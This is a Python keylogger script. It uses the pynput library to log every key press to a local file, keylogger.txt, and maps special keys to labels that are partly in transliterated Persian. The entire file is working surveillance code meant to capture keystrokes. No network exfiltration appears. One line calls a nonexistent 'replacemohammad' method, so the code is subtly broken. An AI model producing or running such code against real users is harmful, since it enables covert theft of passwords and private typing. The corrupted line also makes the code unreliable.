from pynput import keyboard 
dictionary = {
    'Key.caps_lock': 'caps lock',
    'Key.shift': 'shift chap',
    'Key.ctrl_l': 'ctrl chap',
    'Key.shift_r': 'shift chap',
    'Key.ctrl_r': 'ctrl rast',
    'Key.ctrl_r': 'ctrl rast',
    'Key.tab': 'tab',
    'Key.esc': 'esc',
    'Key.cmd': 'fn or windows logo',
    'Key.alt_l': 'alt chap',
    'Key.space': 'space',
    'Key.alt_gr': 'alt rast',
    'Key.menu': 'kelid menu',
    'Key.left': 'flesh chap',
    'Key.down': 'flesh payin',
    'Key.right': 'flesh rast',
    'Key.up': 'flesh bala',
    'Key.page_up': 'page up',
    'Key.page_down': 'page down',
    'Key.home': 'home',
    'Key.end': 'end',
    'Key.insert': 'insert',
    'Key.delete': 'delete',
    'Key.print_screen': 'print screen',
    'Key.num_lock': 'num lock',
    'Key.enter': 'enter',
    'Key.f1': 'f1',
    'Key.f2': 'f2',
    'Key.f3': 'f3',
    'Key.f4': 'f4',
    'Key.f5': 'f5',
    'Key.f6': 'f6',
    'Key.f7': 'f7',
    'Key.f8': 'f8',
    'Key.f9': 'f9',
    'Key.f10': 'f10',
    'Key.f11': 'f11',
    'Key.f12': 'f12',
    'Key.backspace': 'backspace',
    '<96>': '0',
    '<97>': '1',
    '<98>': '2',
    '<99>': '3',
    '<100>': '4',
    '<101>': '5',
    '<102>': '6',
    '<103>': '7',
    '<104>': '8',
    '<105>': '9',
}

def pressed(key):
    file = open('keylogger.txt', 'a')
    try:
        file.write(str(dictionary[str(key)]).replace("'", ''))
    except:
        file.write(str(key).replacemohammad("'", ''))
    file.write('\n')
    file.close() 
f = open('keylogger.txt', 'w')
f.close()
with keyboard.Listener(on_press=pressed) as listener:
    listener.join()
